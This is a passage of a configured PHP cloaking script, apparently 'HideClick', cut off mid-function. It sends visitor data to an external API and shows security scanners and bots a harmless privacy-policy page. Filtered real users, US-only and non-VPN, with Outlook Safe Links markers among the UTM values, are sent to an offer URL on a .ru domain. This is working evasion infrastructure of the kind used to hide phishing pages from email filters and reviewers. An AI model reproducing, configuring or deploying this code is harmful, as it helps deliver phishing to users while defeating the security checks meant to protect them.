<?php
/* change 'false' to 'true' to enable passive traffic analytics mode (Ignoring white|offer setting, disabling site protection and bot filtering mode!) Use it as google analytics alternative */
$HCSET['PASSIVE'] = false;

/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://techluminizesa.ru/Ma4Y/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://monday.com/l/privacy/privacy-policy/';//PHP/HTML file or URL used for bots
$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
/*********************************************/
/* Available additional settings  */

/* COUNTRY FILTERS */
$HCSET['FILTER_GEO_MODE'] = 'allow'; // string(allow|reject)
$HCSET['FILTER_GEO_LIST'] = 'us'; // string([2Chars country codes])

/* DEVICE FILTERS */
$HCSET['FILTER_DEV_MODE'] = 'allow'; // 'allow|reject'
$HCSET['FILTER_DEV_LIST'] = 'm_Android,m_iOS,d_macOS,d_Windows'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);

/* UTM FILTERS */
$HCSET['FILTER_UTM_MODE'] = 'allow'; // 'allow|reject'
$HCSET['FILTER_UTM_LIST'] = 'utm_NA, fwlink, LinkId, , nam11, safelink, walkaway'; // 'regExp()';

/* REFERER FILTERS */
$HCSET['FILTER_REF_MODE'] = ''; // 'allow|reject'
$HCSET['FILTER_REF_LIST'] = ''; // 'regExp()';
$HCSET['FILTER_NOREF'] = ''; // 'allow|reject';

/* NETWORK FILTERS */
$HCSET['FILTER_NET_MODE'] = 'reject'; // 'allow|reject'
$HCSET['FILTER_NET_LIST'] = 'vpn'; // string([vpn|mobile|residential|corporate]);

/* NETWORK FILTERS */
$HCSET['FILTER_BRO_MODE'] = ''; // 'allow|reject'
$HCSET['FILTER_BRO_LIST'] = ''; // string([Chrome|Safari|FF|Other]);

/* custom AI models and settings for PRO version */
$HCSET['mlSet'] = '';

/* OFFER_PAGE display method. Available options: meta, 302, iframe */
/* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
/* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
$HCSET['OFFER_METHOD'] = 'meta';

/* WHITE_PAGE display method. Available options: curl, 302 */
/* 'curl' - uses a server request to display third-party whitepage on your domain */
/* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
$HCSET['WHITE_METHOD'] = '302privacy';

/* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
$HCSET['BLOCK_DDOS'] = false;
/* DELAY_START allows you to block the first X unique IP addresses. */
$HCSET['DELAY_START'] = 0;
/* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
$HCSET['DELAY_PERMANENT'] = false;
/* DELAY_NONBOT do not count blocked request in DELAY_START counter */
$HCSET['DELAY_NONBOT'] = false;
/* USE_SESSIONS do not block user's request after successful check */
$HCSET['USE_SESSIONS'] = true;

/* The next settings are needed only if your hosting isn't standart or something doesn't work */
$HCSET['DISABLE_CACHE'] = false; // true|false
$HCSET['SKIP_CACHE'] = false ; // true|false
/*********************************************/
/* You API key.                              */
/* DO NOT SHARE API KEY! KEEP IT SECRET! */
$HCSET['API_SECRET_KEY'] = $_ENV['API_SECRET_KEY'];
/*********************************************/

$HCSET['groupByDomain'] = '';
$HCSET['stage'] = '';
$HCSET['secret'] = '';

// DO NOT EDIT ANYTHING BELOW !!!
if (!empty($HCSET['VERSION']) || !empty($GLOBALS['HCSET']['VERSION'])) die('Recursion Error');
// dirty hacks to protect from death loops
if (function_exists('debug_backtrace') && sizeof(debug_backtrace()) > 2) {
    echo "WARNING: INFINITE RECURSION PROTECTION";
    die();
}
$HCSET['VERSION'] = 20240129;
/* dirty fix!!! uncomment only if problem with IP detection!!! */
//if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];

$errorContactMessage = "<br><br>Something went wrong. Contact support";
if (!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}$#', $_GET['utm_allow_geo'])) {
    $HCSET['FILTER_GEO_LIST'] = $_GET['utm_allow_geo'];
    $HCSET['FILTER_GEO_MODE'] = 'allow';
}
if ($HCSET['DISABLE_CACHE']) {
    disable_cache();
}
if($HCSET['SKIP_CACHE']) {
    setcookie("GDPR", time(), time()+3600, "", "", 1, 0);
}
if($HCSET['DEBUG_MODE'] == 'on') {
    if (!empty($_SERVER['HTTP_X_HC_SELF_TEST']) || (!empty($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] === 'HC_SELF_TEST')) {
        self_test_response();
        die;
    } else if ($_SERVER['HTTP_USER_AGENT'] === '') {
        die('404');
    }
}
if (!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key'] == $HCSET['API_SECRET_KEY']))) {
    if (function_exists('ini_set')) {
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
    }
    if (function_exists('error_reporting')) {
        error_reporting(E_ALL);
    }
    if ($_REQUEST['hctest'] == 'offer') showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD']);
    else if ($_REQUEST['hctest'] == 'white') showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD']);
    else if ($_REQUEST['hctest'] == 'debug') {
        if (function_exists('phpinfo')) phpinfo();
        if (function_exists('debug_backtrace')) print_r(debug_backtrace());
        $HCSET['API_SECRET_KEY'] = 1;
        print_r(htmlentities(print_r($HCSET,true)));
        die();
    }
    else if ($_REQUEST['hctest'] == 'test') {
        if (!function_exists('curl_init')) {
            echo "<br>CURL not found<br>\n";
            $http_response_header = array();
            echo "HTTP domain";
            $statistic = file_get_contents('http://api.hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'protocol_version' => 1.1, 'timeout' => 5, 'header' => "Content-type: application/json\r\nConnection: close\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
            print_r($http_response_header);
            echo "<br>\n";
            print_r($statistic);
            echo "<hr>\n";
        } else {
            $body = 'ping';
            echo "<br>using CURL<br>\n";
            $ch = curl_init();
            echo "HTTP domain";
            curl_setopt($ch, CURLOPT_URL, 'http://api.hideapi.xyz/status');
            if (!empty($body)) {
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
            }
            if (!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $r = @curl_exec($ch);
            $info = curl_getinfo($ch);
            print_r($info);
            echo "<br>\n";
            curl_close($ch);
            echo "$r<hr>\n";
        }
    }
    else if ($_REQUEST['hctest'] == 'time') {
        header("Cache-control: public, max-age=999999, s-maxage=999999");
        header("Expires: Wed, 21 Oct 2025 07:28:00 GMT");
        echo str_replace(" ", "", rand(1, 10000) . microtime() . rand(1, 100000));
    }
    die();
}

if ($HCSET['DEBUG_MODE'] == 'on') {
    $messages = self_test_request($HCSET);
    echo "<html><head>    <style type=\"text/css\">\n        img {\n            opacity: 0.25;\n        }\n        img:hover {\n            opacity: 1.0;\n        }\n        .accordion {\n            --bs-accordion-active-bg: white;\n            --bs-accordion-btn-focus-box-shadow: none;\n        }\n    </style></head><body><script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.min.js\"></script><link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css\" rel=\"stylesheet\">";
    // head
    echo '<div class="container my-5"><h2>Congratulations!</h2><h4>Literally in a moment you can increase your ROI.</h4><hr class="col-1 my-4"></div>';
    // errors
    if($messages['errors']) echo "    <div class=\"container my-5\">\n        <h4>Make sure that everything is configured correctly:</h4>\n        <div class=\"col-lg-8 px-4\" id=\"debugMessages\">\n\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <h5>Correct the errors and reload the page!</h5>\n            <p>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>.\n            </p>\n        </div>\n    </div>\n";
    else echo "    <div class=\"container my-5\">\n        <h4>Make sure that everything is configured correctly:</h4>\n        <div class=\"col-lg-8 px-4\" id=\"debugMessages\">\n\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <p>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>.\n            </p>\n        </div>\n    </div>\n";
    // good
    if(!$messages['errors']) echo "    <div class=\"container my-5\">\n        <h4>Last step:</h4>\n        <div class=\"col-lg-8 px-4\">\n            <p>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#".inlineEditor("\$HCSET['DEBUG_MODE']")."</b> to\n                <b>off</b>.\n            </p>\n            <img src=\"https://hide.click/gif/debug.gif\" border=\"1\"><br><br>\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <h6>After that, the script will start working in production mode and instead of this page you will see offer\n                page or white page (depends on settings).</h6>\n        </div>\n        <hr class=\"col-1 my-4\">\n    </div>";
    // marketing tips
    echo "<div class=\"container my-5\">\n        <div class=\"accordion\" id=\"marketingTips\">\n            <div class=\"accordion-item\">\n              <h4 class=\"accordion-header\">\n                <button  style=\"background-color: #c2d4e3\" class=\"accordion-button collapsed\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#collapsemarketingTips\" aria-expanded=\"true\" aria-controls=\"collapsemarketingTips\">\n                    <h5>Best practices for targeting</h5>\n                </button>\n              </h4>\n                <div id=\"collapsemarketingTips\" class=\"accordion-collapse collapse hide\" data-bs-parent=\"#marketingTips\">\n                    <div class=\"accordion-body\">\n                        <ul>\n                            <li>Always use geotargeting and create separate campaigns for different geos, grouping them by time zones, languages, and similarly performing markets.</li>\n                            <li>Use UTM parameters to track the performance of your marketing campaigns, identify the most effective channels and traffic sources, and optimize your marketing strategy to improve your return on investment. For example:<ul><li>Google/GDN/Youtube:<code>?utm_source=google&utm_campaign={campaignid}&utm_placement={placement}&utm_term={keyword}</code></li><li>Facebook/Instagram:<code>?utm_source=facebook&utm_campaign={{campaign.name}}&utm_placement={{placement}}&utm_term={{site_source_name}}</code></li><li>Tiktok/Bytedance:<code>?utm_source=tiktok&utm_campaign=__CAMPAIGN_NAME__&utm_placement=_PLACEMENT_&utm_term=_CID_NAME_</code></li><li>Reddit:<code>?utm_source=reddit&utm_campaign={{CAMPAIGN_ID}}&utm_placement={{ADVERTISING_ID}}&utm_term={{POST_ID}}</code></li><li>Pinterest:<code>?utm_source=pinterest&utm_campaign={campaignname}&utm_term={keyword}</code></li><li>Snapchat:<code>?utm_source=snapchat&utm_campaign={{campaign.name}}&utm_placement={{site_source_name}}</code></li><li>Outbrain:<code>?utm_source=outbrain&utm_campaign={{campaign_name}}&utm_content={{publisher_name}}&utm_term={{section_name}}</code></li><li>Taboola:<code>?utm_source=taboola&utm_campaign={campaign_name}&utm_placement={site_id}&utm_content={site}&utm_term={site_domain}</code></li><li>Bing/Microsoft:<code>?utm_source=bing&utm_campaign={Campaign}&utm_placement={Network}&utm_content={TargetId}&utm_term={keyword:default}</code></li><li>VK/MyTarget:<code>?utm_source=mytarget&utm_campaign={{campaign_name}}&utm_term={{geo}}_{{gender}}_{{age}}_{{search_phrase}}</code></li><li>Yandex/Dzen:<code>?utm_source=yandex&utm_campaign={campaign_id}&utm_source={source}&utm_placement={source_type}&utm_content={retargeting_id}.{interest_id}.{adtarget_id}&utm_term={keyword}</code></li></ul></li>\n                            <li>You can use this file to launch ad campaigns on other domains, but if the campaign performs poorly, it's recommended to generate a new file with more specific targets for the new campaign.</li>\n                                </ul>\n                        </ul>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>";

    echo "<script>let messages=".json_encode($messages)."</script>";
    echo "<script>let uri=new URL(document.location);let endpoint=uri.origin+uri.host+uri.pathname; const debugMessages = document.getElementById('debugMessages');</script>";
    echo "<script>if(uri.origin.indexOf('https')<0) messages.warnings.push('To ensure the security of your website and avoid traffic loss, it is recommended to use HTTPS instead of HTTP! You can use free Cloudflare SSL/TLS solution.')</script>";
    if($HCSET['FILTER_REF_MODE']==='allow' and !stristr($HCSET['FILTER_REF_LIST'],$_SERVER['HTTP_HOST'])) echo "<script>if('".$HCSET['FILTER_REF_LIST']."'.indexOf(uri.host)<0) messages.warnings.push('You have disabled requests from <b>'+uri.host+'</b>. All internal traffic will be blocked. Add <b>'+uri.host+'</b> in <code>\$HCSET[\'FILTER_REF_LIST\']</code> at line<b>#" . inlineEditor("\$HCSET['FILTER_REF_LIST']") . "</b>')</script>";
    echo "<script>if(messages.errors) messages.errors.forEach(message => {  const li = document.createElement('p'); li.innerHTML = '❌ Error: '+message+'</p>';  debugMessages.appendChild(li);});</script>";
    echo "<script>if(messages.warnings) messages.warnings.forEach(message => {  const listItem = document.createElement('p');  listItem.innerHTML = '⚠️ Warning: '+message;  debugMessages.appendChild(listItem);});</script>";
    echo "<script>if(messages.notes) messages.notes.forEach(message => {  const listItem = document.createElement('p');  listItem.innerHTML = '❔ Notice: '+message;  debugMessages.appendChild(listItem);});</script>";
    echo '</body></html>';
    die();
}
else if ($HCSET['PASSIVE'] !== true) {
    if (empty($HCSET['WHITE_PAGE']) || (!strstr($HCSET['WHITE_PAGE'], '://') && !is_file($HCSET['WHITE_PAGE']))) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['WHITE_PAGE'] . "! \r\n<br>" . $errorContactMessage;
        die();
    }
    if (empty($HCSET['OFFER_PAGE']) || (!strstr($HCSET['OFFER_PAGE'], '://') && !is_file($HCSET['OFFER_PAGE']))) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['OFFER_PAGE'] . "! \r\n<br>" . $errorContactMessage;
        die();
    }
    if (function_exists('header_remove')) header_remove("X-Powered-By");
    if (function_exists('ini_set')) @ini_set('expose_php', 'off');
}

// start of code
if ($HCSET['BLOCK_DDOS']) {
    blockDDOS();
}

$HCSETdata = getHeaders();

$HCSET['banReason'] = '';
$HCSET['skipReason'] = '';

if(!empty($_COOKIE['hcsid']) && $_COOKIE['hcsid']==hashDev($HCSET) && $HCSET['USE_SESSIONS']) $HCSET['skipReason'] = 'cookie';

if ($HCSET['DELAY_START']) {
    $ips = file('dummyCounter.txt', FILE_IGNORE_NEW_LINES);
    if (empty($ips)) {
        $ips = array(0 => 0);
        file_put_contents('dummyCounter.txt', "0\n", FILE_APPEND);
    } else $ips = array_flip($ips);

    if (sizeof($ips) <= $HCSET['DELAY_START']) {
        $HCSET['banReason'] .= 'delaystart.';
    }
    if (!empty($ips[hashIP()]) && $HCSET['DELAY_PERMANENT']) {
        $HCSET['banReason'] .= 'delaystartperm.';
    }
}

$HCSETdata = json_encode($HCSETdata);
// Data for ML postprocessing
$tmpWhite = (substr($HCSET['WHITE_PAGE'], 0, 8) == 'https://' || substr($HCSET['WHITE_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['WHITE_PAGE']);
$tmpOffer = (substr($HCSET['OFFER_PAGE'], 0, 8) == 'https://' || substr($HCSET['OFFER_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['OFFER_PAGE']);
$HCSET['W_CRC'] = crc32($tmpWhite);
$HCSET['O_CRC'] = crc32($tmpOffer);
if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $tmpWhite,$match)){
    $HCSET['W_PIXELS'] = implode(',',$match[1]);
}
if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $tmpOffer,$match)){
    $HCSET['O_PIXELS'] = implode(',',$match[1]);
}

$HCSET['STATUS'] = apiRequest($_SERVER["REMOTE_ADDR"], $_SERVER["REMOTE_PORT"], $HCSET, $HCSETdata);
$HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);

// after scoring actions include permanent DDOS and bad actors IP blocking
if ($HCSET['DELAY_START'] && empty($ips[hashIP()])) {
    if (sizeof($ips) <= $HCSET['DELAY_START']) {
        if (!empty($HCSET['STATUS']) && !empty($HCSET['STATUS']['action']) && $HCSET['STATUS']['action'] == 'allow') file_put_contents('dummyCounter.txt', hashIP() . "\n", FILE_APPEND);
        else if ($HCSET['DELAY_NONBOT'] !== true) file_put_contents('dummyCounter.txt', hashIP() . "\n", FILE_APPEND);
    }
}
if ($HCSET['BLOCK_DDOS']) {
    if (!empty($HCSET['STATUS']['ddos'])) {
        // warning: it's permanent ban! we will not knowing when ddos is over!
        // we can block single IP, or use IP mask if needed.
        file_put_contents('dummyCounter.txt', $HCSET['STATUS']['ddos'] . "\n", FILE_APPEND);
    }
}

if ($HCSET['PASSIVE'] !== true) {
    if (empty($HCSET['banReason']) && !empty($HCSET['STATUS']) && !empty($HCSET['STATUS']['action']) && $HCSET['STATUS']['action'] == 'allow') {
        setcookie('hcsid', hashDev($HCSET), time() + 604800);
        showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD'], $HCSET['STATUS']);
    } else {
        showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD'], $HCSET['STATUS']);
    }
    die();
}

function showOfferPage($offer, $method = 'meta', $status = array())
{
    if (substr($offer, 0, 8) == 'https://' || substr($offer, 0, 7) == 'http://') {
        if (!empty($_GET) && !stristr($method,'privacy')) {
            if (strstr($offer, '?')) $offer .= '&' . http_build_query($_GET);
            else $offer .= '?' . http_build_query($_GET);
        }

        if (strstr($offer, '{hc_geo}')) {
            if(!empty($status['geo'])) $offer = str_replace('{hc_geo}', $status['geo'], $offer);
        } else if (strstr($offer, '%7Bhc_geo%7D')) {
            if(!empty($status['geo'])) $offer = str_replace('%7Bhc_geo%7D', $status['geo'], $offer);
        }
        if (strstr($offer, '{hc_uid}')) {
            if(!empty($status['uid'])) $offer = str_replace('{hc_uid}', $status['uid'], $offer);
        } else if (strstr($offer, '%7Bhc_uid%7D')) {
            if(!empty($status['uid'])) $offer = str_replace('%7Bhc_uid%7D', $status['uid'], $offer);
        }
        if (strstr($offer, '{hc_ref}')) {
            if(!empty($_SERVER['HTTP_REFERER'])) $offer = str_replace('{hc_ref}', urlencode($_SERVER['HTTP_REFERER']), $offer);
        } else if (strstr($offer, '%7Bhc_ref%7D')) {
            if(!empty($_SERVER['HTTP_REFERER'])) $offer = str_replace('%7Bhc_ref%7D', urlencode($_SERVER['HTTP_REFERER']), $offer);
        }

        if ($method == '302privacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            header("Location: " . $offer);
        } else if ($method == '302') {
            header("Location: " . $offer);
        } else if ($method == 'iframeprivacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen' rel='noreferrer noopener'></iframe></body></html>";
        } else if ($method == 'iframe') {
            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
        } else if ($method == 'metaprivacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
        } else {
            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
        }
    } else {
        require_once($offer);
    }
    die();
}

function showWhitePage($white, $method = 'curl', $status = array())
{
    if (substr($white, 0, 8) == 'https://' || substr($white, 0, 7) == 'http://') {
        if (!empty($_GET) && !stristr($method,'privacy')) {
            if (strstr($white, '?')) $white .= '&' . http_build_query($_GET);
            else $white .= '?' . http_build_query($_GET);
        }
        if (strstr($white, '{hc_geo}')) {
            if(!empty($status['geo'])) $white = str_replace('{hc_geo}', $status['geo'], $white);
        } else if (strstr($white, '%7Bhc_geo%7D')) {
            if(!empty($status['geo'])) $white = str_replace('%7Bhc_geo%7D', $status['geo'], $white);
        }
        if (strstr($white, '{hc_uid}')) {
            if(!empty($status['uid'])) $white = str_replace('{hc_uid}', $status['uid'], $white);
        } else if (strstr($white, '%7Breq_uid%7D')) {
            if(!empty($status['uid'])) $white = str_replace('%7Bhc_uid%7D', $status['uid'], $white);
        }

        if ($method == '302privacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            header("Location: " . $white);
        } else if ($method == '302') {
            header("Location: " . $white);
        } else {
            $page = http_request($white);
            $page = $page["body"];
            $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
            $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);
            if (empty($page)) {
                header("HTTP/1.1 503 Service Unavailable", true, 503);
            }
            echo $page;
        }
    } else require_once($white);// bots
    die();
}

function inlineEditor($s)
{
    $f = file($_SERVER["SCRIPT_FILENAME"]);
    $r = 0;
    foreach ($f as $n => $l) {
        if (strstr($l, $s)) {
            $r = $n;
            break;
        }
    }
    return $r + 1;
}

function blockDDOS()
{
    $ips = file('dummyDDOS.txt', FILE_IGNORE_NEW_LINES);
    foreach ($ips as $ip) {
        if (!empty($ip)) {
            foreach ($_SERVER as $key => $val) {
                // we can block single IP, or use IP mask if needed.
                if (preg_match("#(^|[^0-9a-f:])$ip#", $val)) {
                    // if IP were used for DDOS, emulate server unavalable error.
                    // warning: it's permanent ban! we will not knowing when ddos is over!
                    header("HTTP/1.1 503 Service Unavailable", true, 503);
                    die();
                }
            }
        }
    }
}

function hashIP()
{
    $ip = '';
    foreach (array('HTTP_CF_CONNECTING_IP', 'CF-Connecting-IP', 'Cf-Connecting-Ip', 'cf-connecting-ip') as $k) {
        if (!empty($_SERVER[$k])) $ip = $_SERVER[$k];
    }
    if (empty($ip)) {
        foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'x-real-ip', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'x-forwarded-for' ,'REMOTE_ADDR') as $k) {
            if (!empty($_SERVER[$k])) $ip .= $_SERVER[$k];
        }
    }
    return crc32($ip);

}

function hashDev($HCSET)
{
    unset($HCSET['STATUS']);
    return hashIP() . crc32($_SERVER['HTTP_USER_AGENT'].$_SERVER["HTTP_HOST"].implode('',array_values($HCSET)));
}

function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    if(!$ip) $ip='127.0.0.1';
    $host = gethostbyname('api.hideapi.xyz');
    if($host=='api.hideapi.xyz') $host = gethostbyname('hideapi.net');

    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2764632684&js=false&stage='.$HCSET['stage'];
    if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
    if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
    if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
    if (!empty($HCSET['skipReason'])) $url .= '&skipReason=' . $HCSET['skipReason'];
    if (!empty($HCSET['VERSION'])) $url .= '&version=' . $HCSET['VERSION'];
    if (!empty($HCSET['WHITE_METHOD'])) $url .= '&wmet=' . $HCSET['WHITE_METHOD'];
    if (!empty($HCSET['OFFER_METHOD'])) $url .= '&omet=' . $HCSET['OFFER_METHOD'];
    if (!empty($HCSET['W_CRC'])) $url .= '&wcrc=' . $HCSET['W_CRC'];
    if (!empty($HCSET['O_CRC'])) $url .= '&ocrc=' . $HCSET['O_CRC'];
    if (!empty($HCSET['W_PIXELS'])) $url .= '&W_PIXELS=' . $HCSET['W_PIXELS'];
    if (!empty($HCSET['O_PIXELS'])) $url .= '&O_PIXELS=' . $HCSET['O_PIXELS'];
    if (!empty($HCSET['DISABLE_CACHE'])) $url .= '&cache=' . $HCSET['DISABLE_CACHE'];
    if (!empty($HCSET['mlSet'])) $url .= '&mlSet=' . $HCSET['mlSet'];
    if (!empty($HCSET['WHITE_PAGE'])) $url .= '&white=' . urlencode($HCSET['WHITE_PAGE']);
    if (!empty($HCSET['OFFER_PAGE'])) $url .= '&offer=' . urlencode($HCSET['OFFER_PAGE']);
    if (!empty($HCSET['DELAY_START'])) $url .= '&delay=' . urlencode($HCSET['DELAY_START']);
    if (!empty($HCSET['DELAY_PERMANENT'])) $url .= '&perm=' . urlencode($HCSET['DELAY_PERMANENT']);
    if (!empty($HCSET['DELAY_NONBOT'])) $url .= '&DELAY_NONBOT=' . urlencode($HCSET['DELAY_NONBOT']);
    if (!empty($HCSET['FILTER_GEO_MODE'])) $url .= '&FILTER_GEO_MODE=' . urlencode($HCSET['FILTER_GEO_MODE']);
    if (!empty($HCSET['FILTER_GEO_LIST'])) $url .= '&FILTER_GEO_LIST=' . urlencode($HCSET['FILTER_GEO_LIST']);
    if (!empty($HCSET['FILTER_DEV_MODE'])) $url .= '&FILTER_DEV_MODE=' . urlencode($HCSET['FILTER_DEV_MODE']);
    if (!empty($HCSET['FILTER_DEV_LIST'])) $url .= '&FILTER_DEV_LIST=' . urlencode($HCSET['FILTER_DEV_LIST']);
    if (!empty($HCSET['FILTER_UTM_MODE'])) $url .= '&FILTER_UTM_MODE=' . urlencode($HCSET['FILTER_UTM_MODE']);
    if (!empty($HCSET['FILTER_UTM_LIST'])) $url .= '&FILTER_UTM_LIST=' . urlencode($HCSET['FILTER_UTM_LIST']);
    if (!empty($HCSET['FILTER_REF_MODE'])) $url .= '&FILTER_REF_MODE=' . urlencode($HCSET['FILTER_REF_MODE']);
    if (!empty($HCSET['FILTER_REF_LIST'])) $url .= '&FILTER_REF_LIST=' . urlencode($HCSET['FILTER_REF_LIST']);
    if (!empty($HCSET['FILTER_NOREF'])) $url .= '&FILTER_NOREF=' . urlencode($HCSET['FILTER_NOREF']);
    if (!empty($HCSET['FILTER_NET_MODE'])) $url .= '&FILTER_NET_MODE=' . urlencode($HCSET['FILTER_NET_MODE']);
    if (!empty($HCSET['FILTER_NET_LIST'])) $url .= '&FILTER_NET_LIST=' . urlencode($HCSET['FILTER_NET_LIST']);
    if (!empty($HCSET['FILTER_BRO_MODE'])) $url .= '&FILTER_BRO_MODE=' . urlencode($HCSET['FILTER_BRO_MODE']);
    if (!empty($HCSET['FILTER_BRO_LIST'])) $url .= '&FILTER_BRO_LIST=' . urlencode($HCSET['FILTER_BRO_LIST']);
    if (!empty($HCSET['BLOCK_DDOS'])) $url .= '&BLOCK_DDOS=' . urlencode($HCSET['BLOCK_DDOS']);
    if (!empty($HCSET['USE_SESSIONS'])) $url .= '&USE_SESSIONS=' . urlencode($HCSET['USE_SESSIONS']);
    if (!empty($HCSET['groupByDomain'])) $url .= '&groupByDomain=' . urlencode($HCSET['groupByDomain']);

    $answer = @http_request($url, 'POST', $HCSETdata);
    if($answer['body']) return $answer['body'];
    else return $answer;
}

function getHeaders() {
    $headers = $_SERVER;
    $headers['path'] = $_SERVER["REQUEST_URI"];
    // fix for roadrunner / IIS
    if (empty($headers['path'])) {
        //HTTP_REQUEST_URI || SCRIPT_URL || HTTP_SCRIPT_URI ???
        if (empty($_SERVER['QUERY_STRING']) && !empty($_GET)) $headers['path'] = $_SERVER["SCRIPT_NAME"] . '?' . http_build_query($_GET);
